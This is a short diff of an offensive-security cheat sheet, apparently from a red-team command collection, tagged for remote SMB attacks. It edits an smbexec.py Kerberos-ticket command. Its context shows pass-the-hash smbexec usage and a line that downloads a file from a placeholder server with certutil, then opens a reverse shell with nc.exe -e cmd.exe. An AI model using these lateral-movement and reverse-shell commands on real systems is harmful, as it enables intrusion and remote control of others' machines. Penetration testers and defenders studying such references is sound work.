@@ -25,5 +25,5 @@ smbexec.py -shell-type powershell -hashes :<nt_hash> <domain>/<user>@<ip>
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
 ```
-export KRB5CCNAME=<ccache>; smbexec.py -shell-type powershell -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <domain>/<user>@<target_name>
+export KRB5CCNAME=<ccache>; smbexec.py -shell-type powershell -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <target_name>
 ```
